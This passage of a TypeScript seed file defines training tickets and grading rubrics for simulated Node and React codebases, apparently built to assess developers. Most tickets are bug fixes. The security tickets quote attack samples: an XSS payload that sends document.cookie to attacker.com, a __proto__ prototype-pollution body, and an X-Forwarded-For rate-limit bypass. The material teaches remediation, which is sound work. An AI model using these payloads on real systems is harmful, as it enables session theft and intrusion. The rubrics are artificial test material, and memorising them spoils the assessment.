      description: `Three customers have complained that their employees' annual leave expired on December 30 instead of December 31. All affected employees are at companies based in Pakistan (UTC+5) or Singapore (UTC+8). UK and EU customers see no issue. The API servers are in UTC+0.

**What's happening:**
\`getLeaveYearExpiry()\` in \`leave.service.ts\` uses \`new Date()\` which returns local server time. On UTC+0 servers, December 31 local time equals December 31 UTC — no shift. For UTC+5/UTC+8 tenants, December 31 midnight local is December 30 at 19:00/16:00 UTC.

**Your task:**
1. Fix \`getLeaveYearExpiry()\` to return December 31 23:59:59 UTC regardless of the server timezone
2. Use \`Date.UTC(year, 11, 31, 23, 59, 59)\` to construct the correct timestamp
3. Ensure all date comparisons in leave expiry checks use UTC consistently

**Files:** \`src/services/leave.service.ts\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/services/leave.service.ts"],
      rubric: {
        diagnosis: "Did they find that new Date() uses local server time and that UTC+5/UTC+8 servers shift the December 31 boundary back by 5/8 hours? Did they understand why UTC+0 servers mask the bug?",
        design: "Did they use Date.UTC() or new Date(Date.UTC(...)) to construct a UTC-specific timestamp? Is the fix consistent — are all other date comparisons in the file also using UTC?",
        communication: "Did they explain why the bug is invisible on UTC+0 servers and in local dev? Did they recommend testing timezone-sensitive code with TZ=UTC+5 in CI?",
        execution: "Does getLeaveYearExpiry() return exactly December 31 23:59:59 UTC regardless of server timezone? Is the year derived from UTC (new Date().getUTCFullYear()) not local time?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-hrm-07-seed-id-007",
      title: "HRM-07: Employee Update Endpoint Vulnerable to Privilege Escalation",
      description: `The security team found that \`PATCH /api/v1/employees/:id\` accepts any JSON payload and merges it directly onto the employee object. An authenticated EMPLOYEE-role user sent \`{ "role": "ADMIN" }\` in the request body and their role was updated. A more dangerous payload is \`{ "__proto__": { "isAdmin": true } }\` which poisons the prototype chain for all objects in the process.

**What's happening:**
\`updateEmployee()\` in \`employee.service.ts\` calls \`Object.assign(employee, updates)\` with the raw request body. No fields are filtered.

**Your task:**
1. Replace \`Object.assign(employee, updates)\` with an explicit allowlist of updatable fields
2. Allowed fields for HR/ADMIN: \`first_name\`, \`last_name\`, \`job_title\`, \`department_id\`, \`base_salary\`, \`status\`
3. Fields that must NEVER be updated via this endpoint: \`id\`, \`tenant_id\`, \`email\`, \`created_at\`
4. The fix must also prevent prototype pollution — do not copy keys that start with \`__\`

**Files:** \`src/services/employee.service.ts\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/services/employee.service.ts"],
      rubric: {
        diagnosis: "Did they identify Object.assign(employee, updates) as the root cause? Did they understand both attack vectors: field injection (escalating role) and prototype pollution (__proto__)?",
        design: "Did they use an explicit allowlist of fields rather than a denylist? Is the allowlist defined as a constant so it's easy to audit? Does it block __proto__ and constructor keys?",
        communication: "Did they classify this as both a privilege escalation and a prototype pollution vulnerability? Did they recommend input validation at the route layer as an additional layer of defence?",
        execution: "Can an attacker no longer update id, tenant_id, or add __proto__ keys via this endpoint? Does the allowlist approach prevent unknown future fields from being accepted automatically?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-hrm-08-seed-id-008",
      title: "HRM-08: Redis Memory Growing Without Bound — Server OOM After 3 Months",
      description: `The Redis instance started at 50MB and is now at 4.2GB after 3 months. It's projected to hit the 6GB limit next month. There are no eviction policies set. A \`redis-cli --scan\` shows millions of keys like \`employee:tenant-xxx:uuid\`, \`report:dept-yyy\` that are stale (referencing deleted employees and closed accounts).

**What's happening:**
\`cache.set()\` in \`utils/cache.ts\` calls \`redis.set(key, value)\` with no expiry argument. Every cached value lives in Redis forever.

**Your task:**
1. Add a default TTL of 300 seconds (5 minutes) to \`cache.set()\`
2. Add an optional \`ttlSeconds\` parameter so callers can override the default for longer-lived data
3. Update all \`cache.set()\` call sites to pass appropriate TTLs where the default is wrong

**Files:** \`src/utils/cache.ts\`, \`src/services/employee.service.ts\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/utils/cache.ts", "src/services/employee.service.ts"],
      rubric: {
        diagnosis: "Did they find that cache.set() uses redis.set() with no EX argument, leaving keys with no expiry? Did they understand the growth mechanism — every cache write is permanent?",
        design: "Did they add EX with a default TTL? Did they make TTL configurable per call-site? Is the default TTL sensible (5-15 minutes for employee data)?",
        communication: "Did they explain why TTL-less caches are a reliability risk (OOM) not just a performance risk? Did they recommend setting a maxmemory-policy on Redis as a safety net?",
        execution: "Does cache.set() now call redis.set(key, value, 'EX', ttl)? Are all call sites updated? Is the TTL parameter typed as optional with a sensible default?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-hrm-09-seed-id-009",
      title: "HRM-09: Login Authenticates Users Across Tenant Boundaries",
      description: `A critical security incident: a user at Company A logged in successfully using Company B's employee email and their own password. The auth system returned Company B's employee record with Company A's JWT. This happened because two tenants onboarded employees with the same email address (common at companies where contractors work across clients).

**What's happening:**
\`findByEmail()\` in \`employee.repository.ts\` queries \`WHERE email = $1\` with no \`tenant_id\` filter. It returns the first matching row regardless of which tenant owns it.

**Your task:**
1. Add \`tenant_id\` as a required parameter to \`findByEmail()\`
2. Update the query to \`WHERE email = $1 AND tenant_id = $2\`
3. Update all call sites that use \`findByEmail()\` to pass the tenant ID
4. Check if any other repository methods are missing the tenant filter

**Files:** \`src/repositories/employee.repository.ts\`, \`src/services/auth.service.ts\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/repositories/employee.repository.ts", "src/services/auth.service.ts"],
      rubric: {
        diagnosis: "Did they find findByEmail() missing the tenant_id filter? Did they check all other repository methods and confirm findById() already has the filter correctly?",
        design: "Did they add tenantId as a required (not optional) parameter? Did they update all call sites? Did they audit other methods for the same class of bug?",
        communication: "Did they classify this as a multi-tenancy isolation vulnerability? Did they recommend a database-level audit of all queries touching the employees table to find any others missing tenant_id?",
        execution: "Does findByEmail() now require and use tenant_id? Does login no longer return cross-tenant employees for matching emails?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-hrm-10-seed-id-010",
      title: "HRM-10: Payroll Job Retries Permanent Errors 5 Times Wasting Queue Slots",
      description: `The payroll job queue is filling up with jobs that retry 5 times before failing. Most of these are permanent errors: \`duplicate key value violates unique constraint (employee_id, period_month, period_year)\` — payroll was already processed for that period. Each retry waits exponentially (1s, 2s, 4s, 8s, 16s = 31 seconds wasted per job). During end-of-month runs this blocks other jobs.

**What's happening:**
The BullMQ worker in \`payroll.job.ts\` is configured with \`attempts: 5\` but never distinguishes between transient errors (network timeout, DB connection lost) and permanent errors (duplicate payroll period, employee not found).

**Your task:**
1. Import \`UnrecoverableError\` from \`bullmq\`
2. In the worker handler, catch known permanent errors (duplicate constraint, employee not found) and re-throw as \`new UnrecoverableError(message)\`
3. Transient errors (connection errors, timeouts) should still retry normally
4. BullMQ moves \`UnrecoverableError\` jobs directly to the failed state without retrying

**Files:** \`src/jobs/payroll.job.ts\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/jobs/payroll.job.ts"],
      rubric: {
        diagnosis: "Did they identify that all errors are retried including permanent validation failures? Did they understand that UnrecoverableError is BullMQ's mechanism for non-retryable jobs?",
        design: "Did they use UnrecoverableError for permanent failures (duplicate period, not found)? Are transient errors (network, timeout) still retried? Is the error classification reasonable?",
        communication: "Did they explain the wasted queue capacity and latency from retrying permanent errors? Did they discuss how to distinguish transient from permanent errors (error message patterns, PostgreSQL error codes)?",
        execution: "Do duplicate-period errors go directly to failed state without retrying? Do network errors still retry up to 5 times?",
      },
      expectedMinutes: 35,
    },
    {
      id: "ticket-hrm-11-seed-id-011",
      title: "HRM-11: Password Reset Token Can Be Used Multiple Times",
      description: `A security researcher reported that after using a password reset link, the same link remains valid and can be used again to set a new password. If an attacker intercepts the reset email (forwarded email, shared mailbox, phishing) they can reset the password again after the legitimate user already used it — effectively locking the user out.

**What's happening:**
\`resetPassword()\` in \`auth.service.ts\` validates the token and updates the password but never deletes the \`password_resets\` row. The token remains in the database and passes the \`expires_at > NOW()\` check on every subsequent use.

**Your task:**
1. After successfully updating the password, delete the used token: \`DELETE FROM password_resets WHERE token = $1\`
2. Wrap the UPDATE and DELETE in a single database transaction so both succeed or both roll back
3. Also invalidate any other active reset tokens for the same user (a user should only have one valid reset at a time)

**Files:** \`src/services/auth.service.ts\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/services/auth.service.ts"],
      rubric: {
        diagnosis: "Did they find the missing DELETE after the password update? Did they understand the attack scenario — intercepted link used after legitimate reset?",
        design: "Did they delete the token after use? Did they wrap UPDATE + DELETE in a transaction? Did they also delete other active tokens for the same user?",
        communication: "Did they explain the one-time-use requirement for reset tokens? Did they mention adding used_at timestamp as an alternative to deletion (for audit purposes)?",
        execution: "Is the token deleted after successful use? Is the operation transactional? Can the same token no longer be used after the first use?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-hrm-12-seed-id-012",
      title: "HRM-12: Payslip Download Freezes the Entire API for Several Seconds",
      description: `When a payroll admin downloads payslips for the full company (200 employees), all other API requests time out for 8–12 seconds. The request queue backs up with hundreds of pending requests. Individual payslip downloads also cause a 2–3 second freeze for any concurrent users.

**What's happening:**
\`generatePayslip()\` in \`pdf.service.ts\` uses PDFKit's streaming API but collects the buffer synchronously inside the same event loop tick. This is pure CPU work with no async yield — Node.js cannot process any other callbacks until it completes.

**Your task:**
1. Refactor \`generatePayslip()\` to return \`Promise<Buffer>\` using PDFKit's stream events properly
2. Use \`new Promise<Buffer>((resolve, reject) => { ... })\` wrapping the \`doc.on('end')\` and \`doc.on('error')\` events
3. The caller in \`payroll.ts\` route must \`await\` the result
4. For bulk payslip generation, process employees sequentially with \`await\` between each (do not Promise.all — that just parallelises the CPU blocking)

**Files:** \`src/services/pdf.service.ts\`, \`src/routes/payroll.ts\``,
      difficulty: Difficulty.SENIOR,
      filesInvolved: ["src/services/pdf.service.ts", "src/routes/payroll.ts"],
      rubric: {
        diagnosis: "Did they identify that synchronous Buffer.concat inside the same tick blocks the event loop? Did they understand that wrapping sync code in a Promise does NOT make it async — it still blocks?",
        design: "Did they wrap the PDFKit stream in a Promise that resolves on 'end' and rejects on 'error'? Is the result awaited in the route handler? Did they avoid Promise.all for bulk generation?",
        communication: "Did they explain that Node.js is single-threaded and synchronous CPU work blocks all I/O? Did they mention worker_threads as an alternative for heavy CPU work?",
        execution: "Does generatePayslip() return Promise<Buffer>? Does the event loop remain responsive during PDF generation? Is the route handler updated to await the result?",
      },
      expectedMinutes: 50,
    },
    {
      id: "ticket-hrm-13-seed-id-013",
      title: "HRM-13: Internal Stack Traces Exposed in API Error Responses",
      description: `During a routine test, a developer noticed that API errors return the full Node.js stack trace in the response body. Example response to a malformed request:
\`\`\`json
{
  "error": "Cannot read properties of undefined",
  "stack": "TypeError: Cannot read properties of undefined\\n    at EmployeeService.updateEmployee (C:\\\\app\\\\src\\\\services\\\\employee.service.ts:34:18)\\n    at..."
}
\`\`\`
This exposes internal file paths, line numbers, and the tech stack to anyone making requests — information that directly assists attackers in targeting the application.

**Your task:**
1. Fix \`errorHandler\` in \`src/middleware/error.middleware.ts\` to only include \`stack\` in non-production environments
2. In production (\`NODE_ENV === 'production'\`), return only \`{ error: "Internal server error" }\` for unhandled exceptions
3. Keep the full error details in server-side logs regardless of environment
4. For known operational errors (validation errors, not-found), the message is safe to return — only suppress stack traces for unexpected errors

**Files:** \`src/middleware/error.middleware.ts\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/middleware/error.middleware.ts"],
      rubric: {
        diagnosis: "Did they find the unconditional stack: err.stack in the response? Did they understand the information leakage risk — file paths and line numbers help attackers target exploits?",
        design: "Is the stack only included when NODE_ENV !== 'production'? Does the production response return a generic message for unexpected errors? Are logs still written regardless of environment?",
        communication: "Did they distinguish between operational errors (safe to surface) and programmer errors (stack should be hidden)? Did they mention that logging the full error server-side is non-negotiable for debugging?",
        execution: "In production mode, does the response body contain no stack trace? Is the error still logged to console.error with the full stack? Is the fix just a NODE_ENV check?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-hrm-14-seed-id-014",
      title: "HRM-14: Rate Limiter Bypassed by Spoofing X-Forwarded-For Header",
      description: `A penetration tester demonstrated that the rate limiter at \`POST /api/v1/auth/login\` can be completely bypassed. By sending \`X-Forwarded-For: <random-ip>\` with each request, they ran 10,000 login attempts in under a minute — far exceeding the 100 req/min limit. This enables credential stuffing attacks against any tenant.

**What's happening:**
\`getRateLimitKey()\` in \`rateLimit.middleware.ts\` uses the \`X-Forwarded-For\` header as the rate limit key without any validation. An attacker can set this to a different value on every request.

**Your task:**
1. Remove the \`X-Forwarded-For\` based key — use \`req.socket.remoteAddress\` as the canonical IP
2. If the app is genuinely behind a trusted reverse proxy (like Railway or Vercel), use the first IP from \`X-Forwarded-For\` ONLY if an environment variable \`TRUST_PROXY=true\` is set
3. For the login endpoint specifically, also add a per-\`email\` rate limit (max 5 failed attempts per email per 15 minutes) in addition to the IP limit

**Files:** \`src/middleware/rateLimit.middleware.ts\`, \`src/routes/auth.ts\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/middleware/rateLimit.middleware.ts", "src/routes/auth.ts"],
      rubric: {
        diagnosis: "Did they find that getRateLimitKey() unconditionally trusts X-Forwarded-For? Did they understand the bypass — rotating this header gives a fresh limit window each time?",
        design: "Did they fall back to req.socket.remoteAddress as the default? Did they make proxy trust opt-in via env var? Did they add a per-email rate limit on the login route?",
        communication: "Did they explain why X-Forwarded-For is dangerous to trust without proxy configuration? Did they mention that the per-email limit catches distributed attacks that use many IPs?",
        execution: "Can attackers no longer bypass the limit by rotating X-Forwarded-For? Is the per-email limit implemented on the login route? Is TRUST_PROXY opt-in not opt-out?",
      },
      expectedMinutes: 40,
    },
    {
      id: "ticket-hrm-15-seed-id-015",
      title: "HRM-15: Deleting a Department Makes Its Employees Invisible in Reports",
      description: `An HR admin deleted the \"Contractors\" department after all contractors had been converted to full-time employees. The next day, the payroll team reported that 23 employees were missing from the monthly payroll report. The employees still exist in the database but their \`department_id\` points to a deleted department — they are excluded from any query that JOINs to the departments table.

**What's happening:**
\`deleteDepartment()\` in \`department.service.ts\` deletes the department row but never clears or reassigns the \`department_id\` on employees who belonged to it. The console warning is emitted but ignored.

**Your task:**
1. Before deleting the department, set \`department_id = NULL\` for all employees who belong to it: \`UPDATE employees SET department_id = NULL WHERE department_id = $1 AND tenant_id = $2\`
2. Wrap the employee update and department delete in a single database transaction
3. Return an error (HTTP 409) if the department has a \`manager_id\` set — the manager assignment must be cleared first, or handle it automatically

**Files:** \`src/services/department.service.ts\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/services/department.service.ts"],
      rubric: {
        diagnosis: "Did they find the missing UPDATE employees SET department_id = NULL before the DELETE? Did they understand that dangling foreign keys cause employees to disappear from JOINs?",
        design: "Did they add the UPDATE before the DELETE? Did they wrap both in a transaction? Did they handle the manager_id case?",
        communication: "Did they explain why the console.warn is insufficient — it warns but still leaves the database in an inconsistent state? Did they mention adding a DB-level CASCADE or RESTRICT as an alternative?",
        execution: "Are all employees in the deleted department reassigned to NULL department_id? Is the operation transactional? Do the employees now appear correctly in reports after deletion?",
      },
      expectedMinutes: 25,
    },
  ];

  for (const t of techCorpTickets) {
    await prisma.ticket.upsert({
      where: { id: t.id },
      update: {},
      create: { ...t, stack: Stack.NODE, codebaseId: techCorpCodebase.id },
    });
  }

  // ── ShopFront codebase ────────────────────────────────────────────────────
  const shopfrontCodebase = await prisma.codebase.upsert({
    where: { id: "shopfront-seed-id-001" },
    update: {},
    create: {
      id: "shopfront-seed-id-001",
      name: "ShopFront",
      stack: Stack.REACT,
      repoUrl: "https://github.com/DevSimulate/shopfront",
      description: "A React 18 + TypeScript e-commerce storefront with Vite, React Router v6, and Axios. Powers a mid-market marketplace serving 40,000 daily active shoppers.",
      companyLore: `ShopFront is a consumer e-commerce platform that launched its React frontend 18 months ago after migrating from a server-rendered PHP monolith. The migration was completed under a hard deadline to meet a Black Friday launch and several architectural shortcuts were taken.

The engineering team is 8 developers across two squads: Storefront (4 devs) and Platform (4 devs). The Storefront squad owns the React codebase. Technical debt has accumulated in the hooks layer and context architecture.

Key facts engineers must know:
- All application state — cart, user, UI flags — lives in a single ShopContext. Every cart update re-renders the entire tree including 50+ product cards on the listing page
- WebSocket connections are opened for live price updates on every product page visit but are never closed. After 10 visits, 10 sockets are active simultaneously
- The auto-save cart interval captures a stale closure — it always POSTs the initial empty cart regardless of what the user has added
- Payment details including CVV and card number are stored in localStorage, accessible to any third-party script on the domain
- Cart totals use raw floating point arithmetic — 3 items at £19.99 = £59.970000000000006 in the checkout UI
- The infinite scroll component fires duplicate API requests when the user scrolls quickly because there is no in-flight guard

Production incidents in the last 30 days:
- Double orders: 23 customers were charged twice on Black Friday due to the missing submit guard on CheckoutForm
- Memory warning: React "Can't perform a state update on an unmounted component" floods Sentry — caused by stale WebSocket handlers
- Empty order history: Users who log in and navigate to /orders see no orders because the useEffect is missing the user dependency`,
    },
  });

  const shopfrontTickets = [
    {
      id: "ticket-shf-01-seed-id-001",
      title: "SHF-01: Auto-Save Cart Always Sends Empty Cart to Server",
      description: `Customer support has received complaints from users who add items to their cart, leave the page, and return to find the cart is empty on the server — even though localStorage has the correct items. The 30-second auto-save interval is firing but POSTing an empty cart.

**What's happening:**
\`useCartSync()\` in \`src/hooks/useCart.ts\` sets up a \`setInterval\` that posts \`cart\` to the server. But the interval callback captures \`cart\` from the initial render (empty array). Even after the user adds items, the interval always POSTs the empty cart. A \`cartRef\` is updated on every render but the interval reads the raw \`cart\` variable, not the ref.

**Your task:**
1. Fix the interval callback in \`useCartSync()\` to read \`cartRef.current\` instead of the stale \`cart\` closure variable
2. Do NOT add \`cart\` to the \`useEffect\` dependency array — that would restart the interval on every cart change
3. After the fix, adding 3 items and waiting 30 seconds should result in a POST with all 3 items

**Files:** \`src/hooks/useCart.ts\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/hooks/useCart.ts"],
      rubric: {
        diagnosis: "Did they identify that setInterval captures the initial cart value and never updates? Did they find the cartRef that is already kept up-to-date but never used inside the interval?",
        design: "Did they replace `cart` with `cartRef.current` inside the interval callback? Did they avoid adding cart to the deps array (which would recreate the interval on every change)?",
        communication: "Did they explain the stale closure mechanism — the interval forms a closure over `cart` at the time the effect runs, and that value never changes inside the closure?",
        execution: "Does the interval now POST the current cart contents after items are added? Is the interval still created only once when userId changes (not on every cart update)?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-shf-02-seed-id-002",
      title: "SHF-02: Search Results Show Stale Data When Typing Fast",
      description: `Users typing quickly in the search box report seeing results flash briefly and then revert to results for an earlier query. For example, typing "camera" shows "Camera Model X" for a moment, then switches to results for "cam" — a slower request from earlier that resolved after the faster one.

**What's happening:**
\`useSearch()\` in \`src/hooks/useSearch.ts\` fires an axios request on every query change but has no \`AbortController\`. If the user types "cam" (request A, slow) then "camera" (request B, fast), request B resolves first and sets correct results. Request A then resolves and overwrites them with stale results.

**Your task:**
1. Create an \`AbortController\` at the top of the \`useEffect\`
2. Pass \`signal: controller.signal\` to the axios config
3. In the cleanup function: \`return () => controller.abort()\`
4. In the catch block, check \`axios.isCancel(err)\` and skip \`setError\` / \`setLoading(false)\` if the request was cancelled

**Files:** \`src/hooks/useSearch.ts\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/hooks/useSearch.ts"],
      rubric: {
        diagnosis: "Did they identify the race condition — slow response for an older query arriving after a faster response for a newer query? Did they understand that the fix must cancel in-flight requests, not just ignore results?",
        design: "Did they use AbortController? Did they pass the signal to axios? Did they abort in the cleanup function? Did they handle the cancelled request in catch (skip setError for AbortError)?",
        communication: "Did they explain why checking response order is insufficient — cancellation prevents the network work entirely, saving bandwidth and CPU? Did they describe the exact race scenario?",
        execution: "Does an in-flight request get cancelled when the query changes? Does the stale response never reach setResults? Does loading correctly reset when the cancelled request's catch is handled?",
      },
      expectedMinutes: 30,
    },
    {
      id: "ticket-shf-03-seed-id-003",
      title: "SHF-03: Memory Leak — WebSocket Connections Never Closed",
      description: `Sentry is logging hundreds of "Can't perform a state update on an unmounted component" warnings per hour. Memory profiling shows WebSocket connections accumulating — after visiting 10 product pages, there are 10 active WebSocket connections all firing \`setLivePrice\` and \`setPriceChange\` on components that were unmounted long ago.

**What's happening:**
\`usePriceUpdates()\` in \`src/hooks/usePriceUpdates.ts\` opens a \`new WebSocket()\` on mount but the \`useEffect\` returns no cleanup function. When the user navigates away, the component unmounts but the WebSocket stays open. Every price update it receives calls \`setState\` on the unmounted component.

**Your task:**
1. Add a cleanup function to the \`useEffect\`: \`return () => ws.close()\`
2. That's the entire fix — one line
3. Verify: visiting 10 product pages in sequence should result in exactly 1 active WebSocket at any time (the current page's), not 10

**Files:** \`src/hooks/usePriceUpdates.ts\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/hooks/usePriceUpdates.ts"],
      rubric: {
        diagnosis: "Did they find the missing cleanup return in the useEffect? Did they understand that React calls the cleanup function on unmount and that WebSocket.close() stops both the connection and its callbacks?",
        design: "Did they add `return () => ws.close()` inside the useEffect? Is it placed after the ws.onmessage and ws.onerror assignments so ws is in scope?",
        communication: "Did they explain the sequence: mount → open WebSocket → unmount → no cleanup → setState on dead component → React warning? Did they note this is also a memory leak (the WebSocket object is retained)?",
        execution: "Does navigating between product pages result in previous WebSocket connections being closed? Are there no more 'state update on unmounted component' warnings from this hook?",
      },
      expectedMinutes: 15,
    },
    {
      id: "ticket-shf-04-seed-id-004",
      title: "SHF-04: Order History Page Always Empty After Login",
      description: `Users navigate to /orders after logging in and always see "No orders found" even when they have a full order history. Refreshing the page shows orders correctly. The issue only occurs when the user navigates to /orders from the login flow — not on a fresh page load where they're already authenticated.

**What's happening:**
The \`useEffect\` in \`OrderHistoryPage.tsx\` has an empty dependency array \`[]\`. When the component mounts before login, \`user\` is null and the fetch is skipped. When the user logs in and \`user\` changes, the effect never re-runs because \`user\` is not in the deps array.

**Your task:**
1. Add \`user\` (or \`user?.id\`) to the \`useEffect\` dependency array in \`OrderHistoryPage.tsx\`
2. The effect already handles the null case (\`if (!user?.id) return;\`) so no other change is needed
3. After the fix, navigating to /orders after login must trigger a fresh fetch

**Files:** \`src/pages/OrderHistoryPage.tsx\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/pages/OrderHistoryPage.tsx"],
      rubric: {
        diagnosis: "Did they find the empty useEffect dep array and understand that it prevents re-running when user changes? Did they confirm the null guard is already present and the only missing piece is the dependency?",
        design: "Did they add `user` or `user?.id` to the dep array? Did they avoid adding unnecessary deps (e.g. the entire setOrders function)?",
        communication: "Did they explain why the bug only appears after login (vs page refresh where user is already set when the component mounts)? Did they note this is a common React pitfall?",
        execution: "Does the effect re-run when user changes from null to a logged-in user? Are orders fetched and displayed after navigating from the login page?",
      },
      expectedMinutes: 15,
    },
    {
      id: "ticket-shf-05-seed-id-005",
      title: "SHF-05: Cart Totals Show Floating Point Errors in Checkout",
      description: `Finance reported that the checkout page occasionally shows totals like £59.970000000000006 and £127.49000000000001. Screenshots from 3 customers this week. The amounts are correct to 2 decimal places in the database — the corruption happens client-side during total calculation.

**What's happening:**
\`calculateCartTotal()\` in \`src/utils/price.ts\` uses \`item.price * item.quantity\` with raw JavaScript floating point. \`3 * 19.99 = 59.970000000000006\` in IEEE 754. The raw float is displayed directly in the UI.

**Your task:**
1. Fix \`calculateCartTotal()\` to return a value rounded to 2 decimal places
2. Use integer arithmetic to avoid accumulation: multiply each price by 100 (pennies), sum as integers, then divide by 100
3. Alternative: use \`Math.round(sum * 100) / 100\` at the end — either approach is acceptable
4. Ensure \`formatPrice()\` also passes the rounded value to Intl.NumberFormat

**Files:** \`src/utils/price.ts\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/utils/price.ts"],
      rubric: {
        diagnosis: "Did they identify IEEE 754 floating point as the cause? Did they understand that the error accumulates across multiple items and becomes visible at 2+ decimal places?",
        design: "Did they use integer arithmetic (pence/cents), Math.round, or parseFloat(total.toFixed(2)) to cap the precision? Did they apply the fix at the reduce step, not just at display time?",
        communication: "Did they explain that the database stores correct values but the client-side calculation corrupts them? Did they recommend the integer arithmetic approach as safer than toFixed for multi-item carts?",
        execution: "Does calculateCartTotal() return exactly 59.97 for 3 × £19.99? Does a cart with 10 × £0.10 items return exactly £1.00?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-shf-06-seed-id-006",
      title: "SHF-06: Removing an Item from Cart Removes the Wrong Item",
      description: `Users report that when they remove an item from the middle of their cart, a different item disappears. For example: cart has [Widget A, Widget B, Widget C]. User clicks Remove on Widget B. Widget C disappears instead. This only happens when items have been added in different sessions or when variant selection is involved.

**What's happening:**
\`CartItemList\` in \`src/components/Cart/CartItem.tsx\` renders list items with \`key={index}\`. When Widget B is removed, the array becomes [Widget A, Widget C]. React sees index 0 and 1 still exist — it reuses the DOM nodes from the original positions, and the component state (quantity inputs, focus) from index 1 (Widget B's node) is now on Widget C's data.

**Your task:**
1. Replace \`key={index}\` with a stable unique key: \`key={\`\${item.productId}-\${item.variantId ?? 'null'}\`}\`
2. This applies to the \`<li>\` element in the \`.map()\` callback
3. After the fix, removing Widget B must correctly remove Widget B and leave Widget A and Widget C intact

**Files:** \`src/components/Cart/CartItem.tsx\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/components/Cart/CartItem.tsx"],
      rubric: {
        diagnosis: "Did they identify key={index} as the root cause? Did they explain the React reconciliation mechanism — when items shift positions, index-keyed nodes are reused for the wrong data?",
        design: "Did they use a stable identifier derived from productId + variantId? Did they handle the null variantId case (products without variants)?",
        communication: "Did they explain when index keys are safe (static, never reordered, never deleted) and why cart items are exactly the wrong use case?",
        execution: "After removing Widget B from [A, B, C], does [A, C] remain with correct quantities and input values? Does no re-render confusion occur?",
      },
      expectedMinutes: 15,
    },
    {
      id: "ticket-shf-07-seed-id-007",
      title: "SHF-07: Double-Click on Place Order Creates Duplicate Orders",
      description: `In the last month, 23 customers were charged twice. Support confirmed all cases: user clicked Place Order, it appeared to hang (slow API response), user clicked again, two orders were created and two charges appeared on their statement. Stripe logs confirm two separate PaymentIntent creates.

**What's happening:**
\`CheckoutForm\` in \`src/components/Checkout/CheckoutForm.tsx\` has a \`submitting\` state variable declared but it is never set to \`true\`. The submit button is never actually disabled during submission, so rapid clicks fire multiple \`POST /checkout\` requests.

**Your task:**
1. Change \`const [submitting] = useState(false)\` to \`const [submitting, setSubmitting] = useState(false)\`
2. At the start of \`handleSubmit\`: add \`if (submitting) return; setSubmitting(true);\`
3. In the \`finally\` block (add one if needed): \`setSubmitting(false)\`
4. The submit button already has \`disabled={submitting}\` — it just needs submitting to actually become true

**Files:** \`src/components/Checkout/CheckoutForm.tsx\``,
      difficulty: Difficulty.JUNIOR,
      filesInvolved: ["src/components/Checkout/CheckoutForm.tsx"],
      rubric: {
        diagnosis: "Did they find the destructured useState that discards the setter (\`const [submitting] = useState\`)? Did they understand this means submitting is permanently false and the button is never disabled?",
        design: "Did they add the setter to the destructuring? Did they add the guard at the top of handleSubmit (if submitting return)? Did they reset submitting in a finally block so it's reset even on error?",
        communication: "Did they explain the business impact (duplicate charges) and why this is a high-priority fix? Did they mention server-side idempotency keys as an additional layer of protection?",
        execution: "Does clicking Place Order twice only create one order? Is the button visually disabled during submission? Is submitting reset to false after the request completes or fails?",
      },
      expectedMinutes: 20,
    },
    {
      id: "ticket-shf-08-seed-id-008",
      title: "SHF-08: Product Description Renders Raw HTML — XSS Vulnerability",
      description: `The security team found that seller accounts can execute JavaScript in buyer browsers by injecting it into the product description field. Payload: \`<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">\`. This was tested in staging and confirmed: the attacker's server received the buyer's session cookie.

**What's happening:**
\`ProductDetail\` in \`src/components/Product/ProductDetail.tsx\` renders the product description using \`dangerouslySetInnerHTML={{ __html: product.description }}\`. Any HTML in the description is rendered and executed by the browser.

**Your task:**
1. Replace \`dangerouslySetInnerHTML\` with safe text rendering
2. If rich text formatting is required, use the \`DOMPurify\` library to sanitise the HTML before rendering: \`import DOMPurify from 'dompurify'; <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(product.description) }} />\`
3. If plain text is sufficient, simply use \`<p>{product.description}</p>\` and remove \`dangerouslySetInnerHTML\` entirely
4. Add \`dompurify\` to package.json if you use the sanitised approach

**Files:** \`src/components/Product/ProductDetail.tsx\``,
      difficulty: Difficulty.MID,
      filesInvolved: ["src/components/Product/ProductDetail.tsx"],
      rubric: {
        diagnosis: "Did they find the dangerouslySetInnerHTML and classify it as an XSS vulnerability? Did they understand that the attack surface is the description field editable by merchants/sellers?",
        design: "Did they either remove dangerouslySetInnerHTML entirely (simplest) or add DOMPurify sanitisation (preserves formatting)? Did they choose the appropriate approach based on whether rich text is needed?",
        communication: "Did they classify this as a stored XSS vulnerability? Did they explain the attack chain — malicious seller injects script, buyer views product, script runs in buyer's browser with buyer's session?",
        execution: "Does the fix prevent script tags and event handlers from executing? If DOMPurify is used, is it applied before the HTML reaches the DOM? Does legitimate formatting (bold, lists) still render if DOMPurify approach is chosen?",
      },
      expectedMinutes: 25,
    },
    {
      id: "ticket-shf-09-seed-id-009",
      title: "SHF-09: Adding to Cart Re-Renders Entire Page Including 50+ Product Cards",
      description: `Performance profiling shows that clicking "Add to Cart" on a product triggers 60–80 component re-renders. On the product listing page with 50 cards, every single card re-renders even though they are purely read-only. The cart button latency is 340ms on a mid-range device — industry standard for e-commerce is under 100ms.

**What's happening:**
